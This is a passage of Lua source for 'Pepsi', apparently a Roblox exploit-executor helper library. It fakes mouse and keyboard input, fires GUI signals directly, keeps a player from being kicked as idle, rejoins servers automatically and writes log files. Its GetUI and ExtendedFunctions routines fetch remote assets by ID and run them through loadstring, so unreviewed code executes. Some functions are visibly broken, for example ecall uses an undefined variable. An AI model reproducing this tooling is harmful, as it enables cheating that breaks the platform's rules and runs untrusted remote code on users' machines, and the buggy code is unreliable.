		return Pepsi.Service("VirtualInputManager"):SendKeyEvent(false, key, false, game)
	elseif type(duration) == "boolean" then
		return Pepsi.Service("VirtualInputManager"):SendKeyEvent(duration, key, false, game)
	else
		return Pepsi.Service("VirtualInputManager"):SendKeyEvent(not Pepsi.Service("UserInputService"):IsKeyDown(key), key, false, game)
	end
end
function Pepsi.Mouse()
	return Pepsi.Me():GetMouse()
end
function Pepsi.acall(func, args) -- Arguments call
	if type(args) == "function" and type(func) ~= "function" then
		func, args = args, func -- Some loser flipped the arguments
	end
	if func then
		if Pepsi.IsA(args, "RemoteEvent") then
			return function()
				return pcall(func, args:FireServer())
			end
		elseif Pepsi.IsA(args, "RemoteFunction") then
			return function()
				return pcall(func, args:InvokeServer())
			end
		elseif type(args) == "function" then
			return function()
				return pcall(func, args())
			end
		elseif type(args) == "table" then
			return function()
				return pcall(func, unpack(args))
			end
		else
			return function()
				return pcall(func, args)
			end
		end
	end
end
function Pepsi.MousePos()
	local m = Pepsi.Mouse()
	return m.X, m.Y
end
function Pepsi.Wait(n)
	if not n then
		return Pepsi.Rs:Wait()
	end
	if type(n) == "number" then
		if n <= 0 then
			return Pepsi.Rs:Wait()
		end
		return wait(n)
	elseif typeof(n) == "Instance" then
		if n.ClassName == "BindableEvent" then
			return n.Event:Wait()
		elseif n.ClassName == "RemoteEvent" then
			local x, sig = pcall(function()
				return n.OnServerEvent
			end)
			if x and sig then
				return sig:Wait()
			else
				x, sig = pcall(function()
					return n.OnClientEvent
				end)
				if x and sig then
					return sig:Wait()
				else
					return n.Changed:Wait()
				end
			end
		end
		return n.Changed:Wait()
	elseif typeof(n) == "RBXScriptSignal" then
		return n:Wait()
	elseif n ~= nil and tonumber(n) ~= nil then
		return wait(tonumber(n))
	end
	return Pepsi.Rs:Wait()
end
function Pepsi.DistFromCenter(x, y) -- Distance from screencenter (used for mousemoverel calc)
	return math.sqrt(math.pow(x - workspace.CurrentCamera.ViewportSize.X / 0x2, 0x2) + math.pow(y - workspace.CurrentCamera.ViewportSize.Y / 0X2, 0X2))
end
function Pepsi.NearMouse(vec, pixels, x, y)
	if vec ~= nil then
		vec = Pepsi.ToVector3(vec)
		local hpos, on_screen = workspace.CurrentCamera:WorldToScreenPoint(vec)
		if type(x) ~= "number" then
			x = Pepsi.MousePos()
		end
		if type(y) ~= "number" then
			local o, y = Pepsi.MousePos()
		end
		if type(x) ~= "number" or type(y) ~= "number" then
			x, y = Pepsi.MousePos()
			if type(x) ~= "number" or type(y) ~= "number" then
				x, y = workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y
			end
		end
		local dist = (((hpos.X - x) ^ 0X2) + ((hpos.Y - y) ^ 0X2)) ^ (0X1 / 0X2) -- Wuzzy units
		if not on_screen then
			dist = (((workspace.CurrentCamera.ViewportSize.X + hpos.X - x) ^ 0X2) + ((workspace.CurrentCamera.ViewportSize.Y + hpos.Y - y) ^ 0X2)) ^ (0X1 / 0X2)
		end
		if pixels == nil then
			if on_screen then
				return dist
			end
		elseif on_screen then
			if dist <= pixels then
				return true
			end
		end
	end
	return false
end
function Pepsi.GetCam()
	return workspace.CurrentCamera
end
function Pepsi.Touching(loser, ...)
	local args, nargs = {...}, {}
	if not Pepsi.IsA(loser, "Player") then
		table.insert(args, loser)
		loser = Pepsi.Me()
	end
	for k, v in pairs(args) do
		if type(v) == "table" then
			for k, v in pairs(v) do
				if Pepsi.IsA(v, "BasePart") then
					table.insert(nargs, v)
				end
			end
		elseif Pepsi.IsA(v, "BasePart") then
			table.insert(nargs, v)
		end
	end
	local torso = Pepsi.Torso(loser)
	if #torso:GetTouchingParts() <= 0 then
		return false
	end
	if Pepsi.IsA(torso, "BasePart") then
		local touched = torso:GetTouchingParts()
		for k, v in pairs(nargs) do
			for n, p in pairs(touched) do
				if rawequal(v, p) then
					return true
				end
			end
		end
	end
	return false
end
function Pepsi.GuiToViewport(gui)
	if typeof(gui) ~= "Instance" or not gui:IsA("GuiBase") then
		Pepsi.Arg(gui, "GuiBase", 1, "Pepsi.GuiToViewport", nil, nil, true)
	end
	local vec = (gui.AbsoluteSize / 2) + gui.AbsolutePosition
	return vec.X, vec.Y + 36, vec
end
function Pepsi.GuiClick(button, mousebutton, usemouse)
	mousebutton = mousebutton or 1
	if typeof(button) == "Instance" and button:IsA("GuiButton") then
		if not usemouse and type(firesignal) == "function" then
			firesignal(button.Activated)
			wait(0.1)
			if mousebutton == 1 then
				firesignal(button.MouseButton1Down)
				wait(0.1)
				firesignal(button.MouseButton1Up)
				wait(0.1)
				return firesignal(button.MouseButton1Click)
			end
			if mousebutton == 2 then
				firesignal(button.MouseButton2Down)
				wait(0.1)
				firesignal(button.MouseButton2Up)
				wait(0.1)
				return firesignal(button.MouseButton2Click)
			end
		else
			local x, y = Pepsi.GuiToViewport(button)
			return Pepsi.Click(math.clamp(mousebutton - 1, 0, 10), x, y)
		end
	end
end
function Pepsi.Click(button, x, y, dur)
	button = button or Enum.UserInputType.MouseButton1 -- This function isnt suposed to be called by an end user, but why not?
	if typeof(button) == "EnumItem" then
		button = button.Value
	end
	if x == nil and y == nil then
		x, y = Pepsi.MousePos()
	end
	if typeof(x) == "Vector2" then
		dur = y
		x, y = Pepsi.Viewport(x)
	end
	if dur == nil then
		dur = 1 / 20 -- Defaults to 0.05 second click
	elseif typeof(dur) == "Instance" then
		dur = dur.Changed -- Damn son. Some one is REALLY thinking outside the fuckn box.
	end
	if x ~= "no" and x ~= nil and y ~= "no" and y ~= nil then
		Pepsi.MoveMouse(x, y)
		Pepsi.Sleep()
	end
	local mymouse = Pepsi.Mouse()
	if type(dur) == "boolean" then
		return Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(x, y + 36, button, dur, game, 0)
	elseif type(dur) == "number" then
		Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(mymouse.X, mymouse.Y + 36, button, true, game, 0)
		wait(dur)
		return Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(mymouse.X, mymouse.Y + 36, button, false, game, 0)
	elseif type(dur) == "function" then
		Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(mymouse.X, mymouse.Y + 36, button, true, game, 0)
		pcall(dur)
		return Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(mymouse.X, mymouse.Y + 36, button, false, game, 0)
	elseif typeof(dur) == "RBXScriptSignal" then -- Realllly compatable, lol
		Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(mymouse.X, mymouse.Y + 36, button, true, game, 0)
		dur:Wait()
		return Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(mymouse.X, mymouse.Y + 36, button, false, game, 0)
	else -- Dur is not compatable
		return Pepsi.Service("VirtualInputManager"):SendMouseButtonEvent(mymouse.X, mymouse.Y + 36, button, not Pepsi.Service("UserInputService"):IsMouseButtonPressed(button), game, 0)
	end
end
function Pepsi.MoveMouse(x, y)
	if x == nil and y == nil then
		x, y = Pepsi.MousePos()
	end
	if typeof(x) == "Vector2" then
		x, y = Pepsi.Viewport(x)
	elseif typeof(x) == "Instance" then
		local vec = Pepsi.ToVector3(x)
		if vec then
			vec, vis = Pepsi.PartToScreen(vec)
			if vis and vec then
				x, y = vec.X, vec.Y
			else
				return
			end
		end
	end
	if x and y then
		return Pepsi.Service("VirtualInputManager"):SendMouseMoveEvent(x, y, game)
	end
end
function Pepsi.PartToScreen(part, cam)
	local npart = (typeof(part) == "Vector3" and part) or Pepsi.ToVector3(part)
	if (typeof(npart) ~= "Vector3" or (typeof(part) ~= "CFrame" and rawequal(npart, Vector3.new()))) or (typeof(cam) ~= "Instance" or cam.ClassName ~= "Camera") then
		Pepsi.Arg(part, {"Part", "Vector3", "CFrame"}, 1, "Pepsi.PartToScreen")
		Pepsi.Arg(cam, {"nil", "Camera"}, 2, "Pepsi.PartToScreen")
	end
	cam = (typeof(cam) == "Instance" and cam) or workspace.CurrentCamera
	return cam:WorldToScreenPoint(npart)
end
function Pepsi.MoveMouseRel(x, y)
	local mx, my = Pepsi.MousePos()
	if x == nil and y == nil then
		x, y = 0, 0
	end
	if typeof(x) == "Vector2" then
		x, y = Pepsi.Viewport(x)
	elseif typeof(x) == "Instance" then
		local vec = Pepsi.ToVector3(x)
		if vec then
			vec, vis = Pepsi.PartToScreen(vec)
			if vis and vec then
				x, y = vec.X, vec.Y
			else
				return
			end
		end
	end
	if x and y then
		x, y = x + mx, y + my
		return Pepsi.Service("VirtualInputManager"):SendMouseMoveEvent(x, y + 36, game)
	end
end
function Pepsi.LeftClick(x, y, dur) -- Mousebutton1down and Up that works even if roblox is minimized or un focused
	if x == nil and y == nil then
		x, y = "no", "no"
	end
	if typeof(x) == "Vector2" then
		dur = y
		x, y = Pepsi.Viewport(x)
	elseif typeof(x) == "Instance" then
		local vec = Pepsi.ToVector3(x)
		if vec then
			dur = y
			vec, vis = Pepsi.PartToScreen(vec)
			if vis and vec then
				x, y = vec.X, vec.Y
			else
				return
			end
		end
	end
	if dur == nil then
		dur = 1 / 20 -- Defaults to 0.05 second click
	elseif typeof(dur) == "Instance" then
		dur = dur.Changed -- Damn son. Some one is REALLY thinking outside the fuckn box.
	end
	return Pepsi.Click(Enum.UserInputType.MouseButton1, x, y, dur)
end
function Pepsi.RightClick(x, y, dur)
	if x == nil and y == nil then
		x, y = "no", "no"
	end
	if typeof(x) == "Vector2" then
		dur = y
		x, y = Pepsi.Viewport(x)
	elseif typeof(x) == "Instance" then
		local vec = Pepsi.ToVector3(x)
		if vec then
			vec, vis = Pepsi.PartToScreen(vec)
			if vis and vec then
				x, y = vec.X, vec.Y
			else
				return
			end
		end
	end
	if dur == nil then
		dur = 1 / 100
	end
	return Pepsi.Click(Enum.UserInputType.MouseButton2, x, y, dur)
end
function Pepsi.MiddleClick(x, y, dur)
	if x == nil and y == nil then
		x, y = "no", "no"
	end
	if typeof(x) == "Vector2" then
		dur = y
		x, y = Pepsi.Viewport(x)
	elseif typeof(x) == "Instance" then
		local vec = Pepsi.ToVector3(x)
		if vec then
			vec, vis = Pepsi.PartToScreen(vec)
			if vis and vec then
				x, y = vec.X, vec.Y
			else
				return
			end
		end
	end
	if dur == nil then
		dur = 1 / 100
	end
	return Pepsi.Click(Enum.UserInputType.MouseButton3, x, y, dur)
end
function Pepsi.Scroll(num)
	local out = true
	if 0 > num then
		out = false
	end
	return Pepsi.Service("VirtualInputManager"):SendMouseWheelEvent(0, math.abs(num), out, game)
end
function Pepsi.Viewport(x, y, sx, sy)
	if typeof(x) == "Vector2" then
		sy, sx = sx, y
		x, y = x.X, x.Y -- Compatability bruh
	end
	return math.round((sx or workspace.CurrentCamera.ViewportSize.X) * x), math.round(y * (sy or workspace.CurrentCamera.ViewportSize.Y))
end
function Pepsi.ToVector2(x, y, no_vec)
	local mouse = nil
	if type(x) == "boolean" and y == nil and no_vec == nil then
		no_vec = x
		x = nil
	end
	if x == nil or y == nil then
		mouse = Pepsi.Mouse()
	end
	local cam = Pepsi.GetCam() or workspace.CurrentCamera
	if no_vec then
		return tonumber(x or mouse.X) / cam.ViewportSize.X, tonumber(y or (36 + mouse.Y)) / cam.ViewportSize.Y
	end
	return Vector2.new(tonumber(x or mouse.X) / cam.ViewportSize.X, tonumber(y or (36 + mouse.Y)) / cam.ViewportSize.Y)
end
function Pepsi.IsA(obj, class) -- typeof on steroids
	if class == type(true) then -- To prevent the function taking "boolean" as a string and not a boolean
		class = true
	elseif class == type(typeof) then
		class = rawequal
	elseif class == typeof(game) then
		class = game
	elseif class == type(newthread) then
		class = newthread
	elseif class == "Vector3" then
		class = Vector3.new()
	elseif class == "Ray" then
		class = Ray.new()
	elseif class == "Enums" then
		class = Enum
	elseif class == "Enum" then
		class = Enum.ActionType
	elseif class == "EnumItem" then
		class = Enum.ActionType.Draw
	elseif class == "number" then
		class = 134663337
	elseif class == "nil" then
		class = nil
	elseif class == "userdata" then
		class = newproxy(true)
	end
	if nil == obj and nil ~= class then
		class = nil
		return false
	elseif typeof(obj) == "Instance" and nil ~= class then
		local back
		if typeof(game) == typeof(class) then
			class, back = class.ClassName, class
		end
		if nil ~= class then
			if obj.ClassName == class or obj:IsA(class) == true then
				class = nil
				return true
			end
		end
		class, back = back, nil
	end
	if typeof(obj) == typeof(class) or typeof(obj) == class or typeof(class) == obj or obj == class then
		class = nil
		return true
	end
	class = nil
	return false
end

-- I want to kill this moth, but the fucker would leave a smear on my godly screen

function Pepsi.ycall(f, ...)
	local args = {...}
	return spawn(function()
		return pcall(f, unpack(args))
	end)
end
function Pepsi.eycall(f, ...)
	local args = {...}
	return spawn(function()
		return Pepsi.ecall(f, unpack(args))
	end)
end
function Pepsi.pwrap(func, args, ...)
	if type(func) ~= "function" then
		Pepsi.Arg(func, {"function"}, 1, "Pepsi.pwrap")
	end
	local ng = {...}
	if table.getn(ng) > 0 then
		return Pepsi.acall(func, {args, ...})
	elseif type(args) == "table" then
		return Pepsi.acall(func, args)
	end
	return function(...)
		return pcall(func, ...)
	end
end
function Pepsi.pywrap(func, args, ...)
	if type(func) ~= "function" then
		Pepsi.Arg(func, {"function"}, 1, "Pepsi.pywrap")
	end
	local nf = Pepsi.pwrap(func, ...)
	if type(nf) ~= "function" then
		local margs = {...}
		if table.getn(margs) > 0 or (type(args) ~= "nil" and type(args) ~= "table") then
			function nf()
				return pcall(func, args, unpack(margs))
			end
		elseif type(args) == "table" then
			function nf()
				return pcall(func, unpack(args))
			end
		else
			function nf(...)
				return pcall(func, ...)
			end
		end
	end
	local x, e = pcall(coroutine.wrap, nf)
	if not x then
		x, e = pcall(coroutine.wrap, function(...)
			return nf(...)
		end)
		if not x then
			return function(...)
				local a = {...}
				return spawn(function()
					return nf(unpack(a))
				end)
			end
		end
	end
	return (type(e) == "function" and e) or coroutine.wrap(function(...)
		return pcall(func, ...)
	end)
end
function Pepsi.Dev(...)
	return Pepsi.scall(Pepsi.DevMsg, ...)
end
function Pepsi.WaitOnAny(...)
	local args = {
		...
	}
	local connections, aggregator, depth, connect = {}, Instance.new("BindableEvent"), 0, nil
	function connect(index, signal)
		depth = tonumber(1 + (depth or 0))
		if typeof(signal) == "RBXScriptSignal" then
			local dupes = 0
			while connections[index] ~= nil do
				local offset = #tostring(dupes)
				dupes = 1 + dupes
				if index:sub(-(offset + 1), -(offset + 1)) == "_" then
					index = index:sub(1, -(offset + 2))
				end
				index = tostring(tostring(index) .. "_" .. tostring(dupes))
			end
			connections[index] = signal:Connect(function(...)
				aggregator:Fire(index, ...)
			end)
		elseif type(signal) == "table" and depth < 4 then
			table.foreach(signal, connect)
		end
	end
	for index, signal in pairs(args) do
		if typeof(signal) == "RBXScriptSignal" then
			connections[index] = signal:Connect(function(...)
				aggregator:Fire(index, ...)
			end)
		elseif type(signal) == "table" then
			table.foreach(signal, connect)
		end
	end
	local result = {
		aggregator.Event:Wait()
	}
	for k, v in pairs(connections) do
		if typeof(v) == "RBXScriptConnection" then
			v:Disconnect()
			v = nil
		end
	end
	aggregator:Destroy()
	return unpack(result)
end
function Pepsi.PartToPlayer(part)
	if typeof(part) == "Instance" then
		local char = part:FindFirstAncestorOfClass("Model")
		if char then
			return Pepsi.Service("Players"):GetPlayerFromCharacter(char)
		end
	end
end
function Pepsi.PartsToPlayers(parts)
	if type(parts) ~= "table" then
		Pepsi.Arg(parts, {"table"}, 1, "Pepsi.PartsToPlayers")
	end
	local losers = {}
	for _, part in pairs(parts) do
		local p = Pepsi.PartToPlayer(part)
		if p then
			losers[p] = true
		end
	end
	return table.keys(losers)
end
function Pepsi.RelativePosition(part, offset, face)
	local vec = (typeof(part) == "CFrame" and part) or Pepsi.ToCFrame(part)
	local off = (type(offset) == "number" and offset) or tonumber(offset)
	local e = face
	if type(off) ~= "number" or typeof(vec) ~= "CFrame" or (type(face) ~= "string" and type(face) ~= "nil" and type(face) ~= "number" and typeof(face) ~= "EnumItem") then
		Pepsi.Arg(part, {"Part", "Vector3", "CFrame"}, 1, "Pepsi.RelativePosition")
		Pepsi.Arg(offset, {"number"}, 2, "Pepsi.RelativePosition")
		Pepsi.Arg(face, {"string", "nil", "number", "EnumItem"}, 3, "Pepsi.RelativePosition")
	elseif type(face) == "string" then
		e = Pepsi.Obj(Enum.NormalId, face)
		if typeof(e) ~= "EnumItem" then
			Pepsi.Arg(face, {"Enumitem"}, 3, "Pepsi.RelativePosition")
		end
	elseif type(face) == "number" then
		local x, de = pcall(Instance.Make, "Decal", {
			Face = face
		}, 30)
		if x and de then
			e = de.Face
			de:Destroy()
			de = nil
		end
	end
	if typeof(e) ~= "EnumItem" then
		Pepsi.Arg(face, {"EnumItem"}, 3, "Pepsi.RelativePosition")
	end
	local cftype = ({
		[Enum.NormalId.Front] = {"LookVector", 1},
		[Enum.NormalId.Back] = {"LookVector", -1},
		[Enum.NormalId.Left] = {"RightVector", -1},
		[Enum.NormalId.Right] = {"RightVector", 1},
		[Enum.NormalId.Top] = {"UpVector", 1},
		[Enum.NormalId.Bottom] = {"UpVector", -1}
	})[e]
	if type(cftype) ~= "table" then
		Pepsi.Arg(face, {"EnumItem"}, 3, "Pepsi.RelativePosition")
	end
	cftype = (type(cftype) == "table" and cftype) or {"LookVector", 1}
	local dvec, mult = unpack(cftype)
	if type(dvec) ~= "string" or type(mult) ~= "number" then
		Pepsi.Arg(face, {"EnumItem"}, 3, "Pepsi.RelativePosition")
	end
	if mult ~= 1 then
		off = off * mult
	end
	return (vec[cftype] * off) + vec
end
function Pepsi.Pos(user)
	user = user or Pepsi.Torso()
	if typeof(user) == "Instance" and user:IsA("ValueBase") then
		if not user.Value then
			return
		end
		user = user.Value
	end
	if typeof(user) == "CFrame" then
		return user.Position
	elseif typeof(user) == "Vector3" then
		return user
	elseif typeof(user) == "Instance" and user:IsA("BasePart") then
		return user.Position
	elseif typeof(user) == "Instance" and user:IsA("Model") and user.PrimaryPart then
		return user.PrimaryPart.Position
	elseif typeof(user) == "Instance" and user:IsA("Player") and Pepsi.Torso(user) then
		return Pepsi.Torso(user).Position
	elseif user and typeof(user) == "Instance" and (user:FindFirstChildWhichIsA("BasePart") or user:FindFirstChildWhichIsA("BasePart", true)) then
		local p = user:FindFirstChildWhichIsA("BasePart")
		return p and p.Position or user:FindFirstChildWhichIsA("BasePart", true).Position
	end
end
function Pepsi.DevMsg(...) -- Pepsi.Dev("**", "msg") // Forces a dev-only message to appear to non-devs
	if not shared.dev then
		return
	end
	if #({...}) == 1 or shared.dev == "*" then
		return Pepsi.Hint(Pepsi.Msg(...))
	elseif not Pepsi.IsA(shared.dev, "nil") then
		local args = {...}
		local channel = tonumber(args[1] or 1) or 1
		table.remove(args, 1)
		local msg = Pepsi.Msg(unpack(args))
		if shared.dev == channel or channel == "**" then
			return Pepsi.Hint(Pepsi.Msg(...))
		elseif channel == "***" then -- Make the user fully aware
			return Pepsi.Splash(Pepsi.scall(Pepsi.Error, Pepsi.Msg(...)))
		end
	end
end
function Pepsi.GetDimensions(Obj)
--	local objPos = modelObj:GetModelCFrame()
--	local objOrientation, objSize = modelObj:GetBoundingBox()
--	
--	local topLeftPos, topLeftVis = toViewport(Cam, objPos * CFrame.new(objSize / 2))
--	local bottomRightPos, bottomRightVis = toViewport(Cam, objPos * CFrame.new(objSize * negYZ / 2))
--	local bottomBehindRightPos, bottomBehindRightVis = toViewport(Cam, objPos * CFrame.new(objSize * negXY / 2))
	-- wip
end
function Pepsi.GetUI(v)
	v = math.clamp(tonumber(v or 1), 1, 3)
	Pepsi.Notify("Credit", v < 3 and "wally's UI Library Loaded!" or "Project Finity by detourious Loaded!")
	return Pepsi.ecall(loadstring(rawget(game:GetObjects(rawget({"rbxassetid://3590459771", "rbxassetid://4133667265", "rbxassetid://4635412059"}, v)), 0X1).Source))
end
function Pepsi.Msg(...)
	local s = tostring(Pepsi.scall(string.stringify, ...) or "") or ""
	if s:len() > 0 then
		Pepsi.Service("TestService"):Message(s, nil, nil)
		if type(printconsole) == "function" then
			Pepsi.ycall(function()
				local clr = BrickColor.Blue().Color
				if not pcall(printconsole, s or "", clr.R * 255, clr.G * 255, clr.B * 255) then
					pcall(printconsole, s or "", clr)
				end
				clr = nil
			end)
		end
		return tostring(s or "") or ""
	end
end
function Pepsi.ErrorMsg(...)
	local s = tostring(Pepsi.scall(string.stringify, ...) or "") or ""
	if s:len() > 0 then
		Pepsi.Service("TestService"):Error(tostring("error: " .. tostring(s or "")) or "", nil, nil)
		return tostring(s or "") or ""
	end
end
function Pepsi.Rejoin(loser)
	loser = (typeof(loser) == "Instance" and loser) or Pepsi.Me()
	if Pepsi.Server or game.JobId then -- Keep trying, but if its full, goto new server.
		if not pcall(function()
			Pepsi.Service("TeleportService"):TeleportToPlaceInstance(game.PlaceId, tostring(Pepsi.Server or game.JobId), loser or Pepsi.Me())
		end) and not pcall(function()
			Pepsi.Service("TeleportService"):Teleport(game.PlaceId, loser or Pepsi.Me())
		end) then
			Pepsi.Service("TeleportService"):Teleport(game.PlaceId, Pepsi.Service("Players").LocalPlayer) -- wtf...
		end
		local y, x = tostring(Pepsi.WaitUntil(Pepsi.Service("GuiService").ErrorMessageChanged, 10, "Teleport Failed"))
		if not x or not y or string.find(x, "Teleport Failed", nil, true) then
			Pepsi.Service("TeleportService"):Teleport(game.PlaceId, loser or Pepsi.Me())
		end
	else
		return Pepsi.Service("TeleportService"):Teleport(game.PlaceId, loser or Pepsi.Me())
	end
end
function Pepsi.AntiAfk(rejoin)
	if Pepsi.afk then
		Pepsi.afk:Disconnect()
		Pepsi.afk = nil
	end
	if Pepsi.rejoinserver then
		Pepsi.rejoinserver:Disconnect()
		Pepsi.rejoinserver = nil
	end
	local to = time()
	local me = Pepsi.Lp or Pepsi.Me()
	while not me and time() - to < 5 do
		me = Pepsi.Lp or Pepsi.Me()
		wait(0.5)
	end
	Pepsi.afk = me.Idled:Connect(Pepsi.acall(Pepsi.LeftClick, {Vector2.new(1, 1)}))
	if rejoin then
		Pepsi.rejoinserver = Pepsi.Service("GuiService").ErrorMessageChanged:Connect(function(msg)
			if string.find(msg, "Teleport Failed", nil, true) then
				return Pepsi.Service("TeleportService"):Teleport(game.PlaceId, loser)
			else
				return Pepsi.Service("TeleportService"):TeleportToPlaceInstance(game.PlaceId, (Pepsi.Server or game.JobId), Pepsi.Lp)
			end
		end)
	end
	return Pepsi.FixMouse()
end
function Pepsi.Me()
	while not Pepsi.Service("Players").LocalPlayer and wait() do
	end
	Pepsi.Lp = Pepsi.Service("Players").LocalPlayer
	return Pepsi.Lp or Pepsi.Service("Players").LocalPlayer
end
function Pepsi.Notify(title, msg, dur, ico)
	if title ~= nil and msg == nil and dur == nil and ico == nil then
		title, msg, ico = shared.project or "Notification", title, nil
	end
	if type(ico) ~= "nil" and type(ico) ~= "string" then
		ico = "rbxassetid://4427304036"
	end
	return Pepsi.Service("StarterGui"):SetCore("SendNotification", {
		Title = tostring(title or shared.project or ""):upper(),
		Text = tostring(msg or ""):upper(),
		Duration = tonumber(dur or 3.5) or 3.5,
		Icon = ico
	}) or tostring(msg or "") or "My god, what have you dun..."
end
function Pepsi.Error(str, ...)
	local str, orig = tostring(str or "Undefined") or "Undefined", string.stringify(str, ...)
	str = string.stringify(str, ...)
	pcall(warn, "Error:" .. tostring(str or "Undefined"))
	pcall(function()
		if isfile and appendfile and writefile then
			local nstr = tostring(Pepsi.GenerateError(str) or str)
			if not isfile("pepsi_errors.txt") then
				writefile("pepsi_errors.txt", tostring(nstr or str or tostring(orig) or "Undefined") .. "\n")
			else
				appendfile("pepsi_errors.txt", tostring(nstr or str or tostring(orig) or "Undefined") .. "\n")
			end
		end
	end)
	if shared.catch_errors or shared.dev then
		return error(tostring(str or orig or "Fucked."))
	end
	return tostring(orig or str or "") or "Something is truly fucked up. Like really."
end
function Pepsi.Sleep(n)
	if nil == n or type(n) == "number" and n <= 0 then
		Pepsi.Service("RunService").RenderStepped:Wait()
		return true
	end
	n = tonumber(n or 1)
	local ti = nil
	for loops = 1, n do
		ti = {Pepsi.Service("RunService").RenderStepped:Wait()}
	end
	return unpack(ti or {true})
end
function Pepsi.ecall(f, ...) -- Extra Call
	local r = {pcall(f, ...)}
	local b = table.remove(r, 1)
	if b then
		return unpack(r)
	else
		if shared.catch_errors or shared.dev then
			return error(Pepsi.Error(ret[2]), 2)
		end
		Pepsi.Error(tostring(ret[2]))
		return nil
	end
end
function Pepsi.scall(f, ...) -- silent call
	local r = {pcall(f, ...)}
	local b = table.remove(r, 1)
	if b then
		return unpack(r)
	else
		return nil
	end
end
function Pepsi.sycall(f, ...) -- silent yield call
	local args = {...}
	return spawn(function()
		return Pepsi.scall(f, unpack(args))
	end)
end
function Pepsi.IsDescendantOf(descendant, ancestors, ...)
	if descendant and ancestors	then
		local suffix = {...}
		if type(ancestors) ~= "table" then
			ancestors = {ancestors}
		end
		if #suffix > 0 then
			for k, v in pairs(suffix) do
				table.insert(ancestors, v)
			end
		end
		for k, v in pairs(ancestors) do
			if v and typeof(v) == "Instance" then
				if descendant:IsDescendantOf(v) then
					return true
				end
			end
		end
	end
	return false
end
function Pepsi.Obj(set, ...)
	local jumps = {
		...
	}
	local s = {
		dig = false,
		wfc = false,
		silent = true,
		default = nil
	}
	if type(set) == "table" and type(jumps[1]) ~= "nil" and type(jumps[1]) ~= "table" then
		s = table.merge(s, set)
	end
	if typeof(set) == "Instance" or type(set) == "string" or type(set) == "function" then
		table.insert(jumps, 1, set)
	end
	if s.wfc and (type(tonumber(s.dig)) ~= "number" or math.abs(tonumber(s.dig)) <= 0) then
		s.dig = 5
	end
	local goal = (type(jumps[1]) == "function" and table.remove(jumps, 1)) or game
	local tmp, oops, res, last
	for _, v in pairs(jumps) do
		local fnd, res = false, nil
		if type(v) == "string" then
			if goal == game then
				oops, tmp = pcall(function()
					return Pepsi.Service(v) or game:FindService(v) or game[v]
				end)
				if not oops or nil == tmp then
					oops, tmp = pcall(function()
						return game:GetService(v) or game[v]
					end)
				end
				if oops and nil ~= tmp then
					goal, fnd = tmp, true
					last = typeof(goal) == "Instance" and goal or last
				end
			end
			if type(goal) ~= "nil" and not fnd and type(goal) ~= "number" then
				if typeof(goal) == "Instance" then
					oops, tmp = pcall(function()
						if typeof(goal) ~= "Instance" then
							return nil
						end
						if true == s.wfc then
							return goal:WaitForChild(v, tonumber(s.dig or 5)) or goal[v]
						end
						return goal:FindFirstChild(v, s.dig) or goal:FindFirstChild(v) or goal[v]
					end)
					if oops and nil ~= tmp then
						goal, fnd = tmp, true
						last = typeof(goal) == "Instance" and goal or last
					end
				end
				if not fnd then
					oops, tmp = pcall(function()
						return goal[v]
					end)
					if oops and tmp ~= nil then
						goal, fnd = tmp, true
						last = typeof(goal) == "Instance" and goal or last
					end
				end
			end
		elseif typeof(v) == "Instance" then
			goal, fnd = v, true
			last = typeof(goal) == "Instance" and goal or last
		elseif type(goal) == "function" and type(v) == "table" then
			if v.namecall or v.nc then
				res = {
					pcall(goal, last, unpack(v))
				}
			else
				res = {
					pcall(goal, unpack(v))
				}
			end
			oops, tmp = unpack(res)
			if not oops and type(tmp) == "string" and string.rawfind(tmp, "':' not '.'") then
				res = {
					pcall(goal, last, unpack(v))
				}
				oops, tmp = unpack(res)
			end
			if oops and tmp then
				goal, fnd = tmp, true
				last = typeof(goal) == "Instance" and goal or last
			end
		elseif type(v) ~= "nil" and type(goal) ~= "nil" then
			oops, tmp = pcall(function()
				return goal[v]
			end)
			if oops and tmp ~= nil then
				last, goal, fnd = tmp, tmp, true
			end
		end
		if not fnd then
			if not s.silent then
				Pepsi.Error(tostring(v) .. " was not found in " .. tostring(goal))
			end
			goal = s.default
			break
		end
	end
	if type(res) == "table" and res[1] == true then
		table.remove(res, 1)
		return unpack(res)
	end
	return goal or s.default
end
function Pepsi.Char(loser)
	loser = loser or Pepsi.Me() or Pepsi.Service("Players").LocalPlayer
	if typeof(loser) == "Instance" and loser.ClassName ~= "Player" then
		loser = Pepsi.Me() or Pepsi.Service("Players").LocalPlayer
	end
	loser = loser or Pepsi.Lp or Pepsi.Me() or Pepsi.Service("Players").LocalPlayer
	return loser and loser.Character
end
function Pepsi.Player(s)
	return Pepsi.Service("Players"):FindFirstChild(s)
end
function Pepsi.Target()
	return Pepsi.scall(function()
		return Pepsi.Service("Players").LocalPlayer:GetMouse().Target
	end)
end
function Pepsi.Torso(loser)
	local c = Pepsi.Char(loser) or loser
	if c and c.ClassName ~= "Player" then
		return c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso") or c:FindFirstChild("HumanoidRootPart", true) or c:FindFirstChild("Torso", true) or c:FindFirstChild("UpperTorso", true)
	end
end
function Pepsi.ExtendedFunctions()
	return Pepsi.LoadAsset(4726305228)()
end
function Pepsi.GetServices()
	local servs, gs = {}, game.GetService
	for _, s in pairs(game:GetChildren()) do
		local sn = s.Name
		local x, e = pcall(gs, game, sn)
		if x and e then
			servs[sn] = e
		end
	end
	return servs
end
function Pepsi.Vars(env)
	env = table.add(env, Pepsi.GetServices())
	env.LocalPlayer = (env.Players and env.Players.LocalPlayer) or ((Pepsi.Lp or Pepsi.Me()) and (function()
		env.Players = Pepsi.Service("Players") -- How tf did this happen?
		return true
	end)())
	return env -- Incase some dipshit sets it after its been set
end
function Pepsi.Human(loser)
	if typeof(loser) == "Instance" and loser:IsA("Humanoid") then
		return loser
	end
	local c = Pepsi.Char(loser)
	if c then
		return c:FindFirstChildOfClass("Humanoid") or c:FindFirstChildWhichIsA("Humanoid") or c:FindFirstChildOfClass("Humanoid", true) or c:FindFirstChildWhichIsA("Humanoid", true)
	end
end

-- I pepsied the moth, and in return, it pepsied my screen. >_< I shall ensure it never reincarnates again.

function Pepsi.Health(human, ...)
	local dstats = {
		health = {
